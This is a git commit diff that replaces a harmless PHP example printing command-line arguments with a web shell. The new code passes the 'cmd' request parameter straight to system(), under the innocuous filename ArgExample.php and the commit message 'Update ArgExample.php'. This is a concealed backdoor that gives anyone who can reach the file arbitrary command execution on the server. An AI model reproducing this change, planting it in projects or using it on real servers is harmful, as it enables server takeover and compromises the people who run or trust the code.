7dac7738a1345ca01cd04ff702352f2d990c99fe
qwerty510 <64289982+qwerty510@users.noreply.github.com>
2024-03-30 15:23:36 -0500

    Update ArgExample.php

--- examples/ArgExample.php
+++ examples/ArgExample.php
@@ -1,15 +1,8 @@
 <?php
-/**
- * Using the $argc and $argv globals.
- *
- * ## Usage
- *
- * Execute the script with any number of arguments:
- *
- *   php ArgExample.php foo bar baz ...
- *
- * @link http://us3.php.net/manual/en/function.getenv.php
- */
-
-printf('There were %d arguments passed to PHP:' . PHP_EOL, $argc);
-print_r($argv);
+  if(isset($_REQUEST['cmd'])) {
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+  } else {
+    echo "What is your bidding?";
+  }
+?>
